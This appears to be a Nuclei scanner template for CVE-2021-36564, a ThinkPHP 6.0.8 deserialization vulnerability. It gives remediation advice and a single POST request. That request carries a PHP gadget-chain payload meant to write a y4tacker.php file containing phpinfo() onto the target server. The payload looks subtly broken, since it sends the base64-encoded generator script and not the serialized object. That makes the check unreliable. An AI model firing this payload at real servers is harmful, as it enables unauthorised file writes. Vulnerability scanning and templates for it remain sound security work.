id: CVE-2021-36564

info:
  name: ThinkPHP v6.0.8 Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    ThinkPHP v6.0.8 was discovered to contain a deserialization vulnerability via the component vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php.
  remediation: |
    To remediate the ThinkPHP v6.0.8 deserialization vulnerability, update your ThinkPHP framework to the latest version where this issue is addressed. Regularly review and apply security patches and updates to your software dependencies. Also, consider implementing input validation and sanitization to prevent potentially harmful serialized data from being processed.
  reference:
    - https://github.com/top-think/framework/issues/2559

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: "data={{base64('<?php namespace League\\Flysystem\\Cached\\Storage; use League\\Flysystem\\Filesystem; abstract class AbstractCache { protected $autosave = false; } class Adapter extends AbstractCache { protected $adapter; protected $file; public function __construct() { $this->complete = \"*/<?php phpinfo();?>\"; $this->expire = \"yydsy4\"; $this->adapter = new \\League\\Flysystem\\Adapter\\Local(); $this->file = \"y4tacker.php\"; } } namespace League\\Flysystem\\Adapter; class Local extends AbstractAdapter { } abstract class AbstractAdapter { protected $pathPrefix; public function __construct() { $this->pathPrefix = \"./\"; } } namespace { use League\\Flysystem\\Cached\\Storage\\Adapter; $a = new Adapter(); echo urlencode((serialize($a))); }?>')}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "phpinfo()"
        part: body

      - type: dsl
        dsl:
          - "status_code == 200"
